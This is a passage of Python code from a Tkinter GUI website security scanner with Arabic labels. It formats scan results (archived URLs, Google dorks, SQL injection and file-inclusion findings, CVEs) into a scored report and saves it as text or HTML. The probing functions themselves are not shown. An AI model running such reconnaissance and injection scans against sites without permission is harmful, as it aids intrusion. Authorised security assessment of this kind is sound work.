                    if g.get('c', 0) > 0: ad(f" 🔴 {g['q']} — {g['c']}\n   🔗 {g['u']}\n", "danger")
                    elif g.get('c', 0) == -1: ad(f" ⚠️ Rate limit\n", "warn")

            # Wayback
            pr("📸 Wayback..."); wb = e.wayback(apex)
            if wb['int']:
                sec(f"📸 WAYBACK ({len(wb['int'])})")
                for item in wb['int'][:15]:
                    ad(f" 🔴 {unquote(item['url'][:60])}\n", "danger")
                    ad(f"    📸 {item['arc'][:55]}\n", "dim")
            if wb['urls']: ad(f"\n 📊 {len(wb['urls'])} URL مؤرشف\n", "dim")

            # Dorks
            sec("🔍 DORKS")
            for dd in e.dorks(apex): ad(f" 🔍 {dd}\n", "info")

            # Score
            pr("📊 Score...")
            sc, iss, rec = e.score(
                http, sh, ssl_d, pts, fz,
                cves=cves,
                sqli=sq if site_alive else [],
                lfi=lf if site_alive else [],
                has_spf=has_spf,
                has_dmarc=has_dmarc)

            # تأثير CVE على السكور
            critical_cves = [cv for cv in cves if cv['s'] == 'حرج']
            high_cves = [cv for cv in cves if cv['s'] == 'عالي']
            sc = max(0, sc - len(critical_cves)*5 - len(high_cves)*2)

            gr = "🟢 A" if sc>=80 else "🟡 B" if sc>=60 else "🟠 C" if sc>=40 else "🔴 D"
            el = int(time.time() - self.start_time); m, s = divmod(el, 60)

            ad(f"\n╔{'═'*50}╗\n", None)
            ad(f"║  📊 SCORE: {sc}/100 — {gr}\n",
               "ok" if sc>=80 else "warn" if sc>=60 else "danger")
            ad(f"╠{'═'*50}╣\n", None)
            for ic, issue in iss: ad(f"║  {ic} {issue}\n", "danger" if ic=="🔴" else "warn")
            if cves:
                ad(f"╠{'═'*50}╣\n", None)
                ad(f"║  🔓 CVE: {len(critical_cves)} حرج | {len(high_cves)} عالي\n", "danger" if critical_cves else "warn")
            if rec:
                ad(f"╠{'═'*50}╣\n", None)
                ad(f"║  💡 توصيات:\n", "hdr")
                for i, r in enumerate(rec, 1): ad(f"║   {i}. {r}\n", "info")
            if not site_alive:
                ad(f"╠{'═'*50}╣\n", None)
                ad(f"║  ⚠️ فحص غير مكتمل — HTTP لم يرد\n", "warn")
            ad(f"╠{'═'*50}╣\n", None)
            ad(f"║  ✅ {d}\n", "ok")
            ad(f"║  🕐 {datetime.now().strftime('%H:%M:%S')} ⏱️ {m:02d}:{s:02d}\n", "dim")
            ad(f"╚{'═'*50}╝\n", None)

            self.root.after(0, lambda: self._pr(f"✅ {sc}/100 {gr}", 1.0, "100%"))
            self.root.after(0, lambda: self.st.config(text=f"● {d} — {sc}/100"))
            self.scanning = False

        threading.Thread(target=work, daemon=True).start()

    def _cp(self):
        self.root.clipboard_clear()
        self.root.clipboard_append(self.out.get("1.0", "end"))
        self.st.config(text="📋 تم!")

    def _sv(self):
        fn = filedialog.asksaveasfilename(
            defaultextension=".txt",
            initialfile=f"jafar_{datetime.now().strftime('%Y%m%d_%H%M%S')}")
        if fn:
            with open(fn, 'w', encoding='utf-8') as f:
                f.write(self.out.get("1.0", "end"))
            self.st.config(text=f"📄 {os.path.basename(fn)}")

    def _cl(self):
        self._wr(""); self._pr("", 0, "")

    def _html(self):
        fn = filedialog.asksaveasfilename(
            defaultextension=".html",
            filetypes=[("HTML", "*.html")],
            initialfile=f"jafar_{datetime.now().strftime('%Y%m%d_%H%M%S')}")
        if not fn: return
        text = self.out.get("1.0", "end")
        dm = re.search(r'🎯\s*(\S+)', text)
        sm = re.search(r'(\d+)/100', text)
        gm = re.search(r'(🟢 A|🟡 B|🟠 C|🔴 D)', text)
        html = self.eng.gen_html(
            dm.group(1) if dm else "?", text,
            int(sm.group(1)) if sm else 0,
            gm.group(1) if gm else "?")
        with open(fn, 'w', encoding='utf-8') as f: f.write(html)
        self.st.config(text=f"🌐 {os.path.basename(fn)}")
        webbrowser.open(f"file://{os.path.abspath(fn)}")

    def run(self):
        self.root.mainloop()


if __name__ == "__main__":
    App().run()                        